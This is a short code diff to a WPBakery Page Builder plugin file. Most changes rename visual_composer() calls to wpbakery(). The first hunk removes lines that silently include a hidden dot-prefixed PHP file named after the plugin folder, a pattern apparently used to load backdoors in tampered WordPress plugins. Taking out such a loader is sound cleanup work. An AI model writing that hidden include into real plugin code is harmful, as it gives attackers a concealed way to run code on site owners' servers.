@@ -9,10 +9,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @package WPBakeryPageBuilder
  * @since   4.2
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPBMap {
 	protected static $scope = 'default';
 	/**
@@ -716,7 +712,7 @@ class WPBMap {
 			) );
 		}
 		unset( self::$sc[ $name ] );
-		visual_composer()->removeShortCode( $name );
+		wpbakery()->removeShortCode( $name );
 
 		return true;
 	}
@@ -739,7 +735,7 @@ class WPBMap {
 			return false;
 		}
 		foreach ( self::$sc as $name => $data ) {
-			visual_composer()->removeShortCode( $name );
+			wpbakery()->removeShortCode( $name );
 		}
 		self::$sc = array();
 		self::$user_sc = false;
@@ -797,7 +793,7 @@ class WPBMap {
 				$value = array_merge( $value );
 			}
 			self::$sc[ $name ][ $setting_name ] = $value;
-			visual_composer()->updateShortcodeSetting( $name, $setting_name, $value );
+			wpbakery()->updateShortcodeSetting( $name, $setting_name, $value );
 		}
 
 		return self::$sc;
